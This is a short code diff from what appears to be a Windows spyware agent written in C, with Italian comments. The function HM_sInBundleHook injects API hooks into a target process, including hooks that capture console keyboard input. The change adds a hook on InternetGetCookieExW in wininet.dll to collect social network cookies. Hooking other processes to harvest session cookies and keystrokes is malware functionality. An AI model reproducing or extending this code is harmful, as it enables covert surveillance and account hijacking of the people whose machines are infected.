@@ -975,6 +975,10 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExA", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExW", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 
+	// Per i cookie del social
+	HMMAKE_HOOK(dwPid, "InternetGetCookieExW", PM_InternetGetCookieEx, InternetGetCookieExData, PM_InternetGetCookieEx_setup, pServiceData, "wininet.dll");
+	
+
 /*	// --- PM per il print agent...
 	// Le altre funzioni utilizzeranno PARAM[0] per accedere ai dati memorizzati nella
 	// DataStruct di CreateDC (es: handle al memory device)
